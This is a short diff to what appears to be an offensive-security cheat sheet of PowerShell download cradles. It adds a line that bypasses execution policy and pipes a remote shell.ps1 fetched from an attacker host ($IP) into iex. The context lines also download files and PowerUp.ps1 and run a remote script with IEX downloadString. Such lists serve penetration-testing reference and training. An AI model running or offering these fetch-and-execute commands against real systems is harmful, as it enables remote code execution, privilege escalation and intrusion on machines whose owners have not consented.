@@ -182,6 +182,7 @@ ____
     powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
     powershell "(New-Object System.Net.WebClient).DownloadFile('$IP','$PORT')"   
     powershell Invoke-WebRequest -Uri http://$IP:$PORT/PowerUp.ps1 -OutFile C:\Windows\Temp\out  
+    powershell -ep bypass iex (iwr http://$IP/shell.ps1 -useb) 
     
     IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
 
